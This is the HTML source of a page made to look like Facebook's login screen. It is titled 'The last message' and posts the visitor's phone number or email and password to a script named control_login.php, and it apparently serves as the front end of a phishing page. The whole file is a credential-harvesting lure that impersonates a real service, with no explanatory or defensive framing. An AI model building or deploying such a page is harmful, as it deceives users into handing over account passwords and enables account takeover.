<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="style.css">
    <title>The last message</title>
</head>
<body>
    <form action="control_login.php" method="post">
        <div class="nav-head">
            <span class="facebook-logo"><img src="facebook.png" alt="facebook"></span>
            <button class="createAccount">Create Account</button>
        </div>
        <div class="input-group">
            <div>
                <label for="">Phone number or email</label><br>
                <input type="text" name="username" id="" required>
            </div>
            <div class="box-pass">
                <label for="">Password</label><br>
                <input type="password" name="mdp" id="" required>
            </div>
            <button type="submit" class="log-in">Log In</button>
            <div class="input-or">
                <div class="div1"><hr></div><div class="or">or</div><div class="div2"><hr></div>
            </div>
            <div class="bouton-create">
                <button class="bouton-new">Create New Account</button>
            </div>
            <div class="link">
                <a href="#">Forgot Password?</a><br><br>
                <a href="#" class="a2">Help Center</a><br><br><br>
            </div>
        </div>
    </form>
</body>
</html>